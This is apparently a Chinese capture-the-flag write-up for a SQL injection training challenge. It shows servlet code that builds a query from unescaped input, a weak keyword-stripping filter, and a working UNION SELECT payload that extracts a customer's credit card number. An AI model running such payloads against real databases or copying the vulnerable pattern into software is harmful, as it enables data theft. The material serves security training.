# SQL Injection Challenge Three(SQL 注入 3 )

## 题介绍
需要利用SQL注入点获得用户Mary Martin的信用卡号字段的值  

## 功能实现 
请求的数据包  
```
POST /challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6 HTTP/1.1


theUserName=%22+or+%221%22%3D%221
```

对应的解析文件  src/main/java/servlets/module/challenge/SqlInjection3.java

```
log.debug("User Submitted - " + theUserName);
theUserName = SqlFilter.levelThree(theUserName);  //进行了过滤 
log.debug("Filtered to " + theUserName);
String ApplicationRoot = getServletContext().getRealPath("");
log.debug("Servlet root = " + ApplicationRoot );

log.debug("Getting Connection to Database");
Connection conn = Database.getChallengeConnection(ApplicationRoot, "SqlChallengeThree");
Statement stmt = conn.createStatement();
log.debug("Gathering result set");
ResultSet resultSet = stmt.executeQuery("SELECT customerName FROM customers WHERE customerName = '" + theUserName + "'");

// 具体过滤代码 
public static String SqlFilter.levelThree (String input)
{
	log.debug("Filtering input at SQL levelThree");
	input = input.toLowerCase();
	input = input.replaceAll("|", "").replaceAll("&", "").replaceAll("!", "").replaceAll("-", "").replaceAll(";", "");
	while(input.contains("or") || input.contains("true") || input.contains("false") || input.contains("and") || input.contains("is"))  //不允许出现这些字符 
		input = input.replaceAll("or", "").replaceAll("true", "").replaceAll("and", "").replaceAll("false", "").replaceAll("is", "");
	return input;
}
```

## 解题步骤  

当前SQL是查询用户名，要想获得另一个信用卡字段，必须使用联合查询，因此构造联合查询即可 
```  
Mary Martin' union select creditcardnumber from customers where customername='Mary Martin'#
```
怎样猜到信用卡字段?  
根据题的说明即可，拼接出来  
## 总结  

由于输入验证不当导致的问题，增加一些校验，就会提高一些攻击门槛 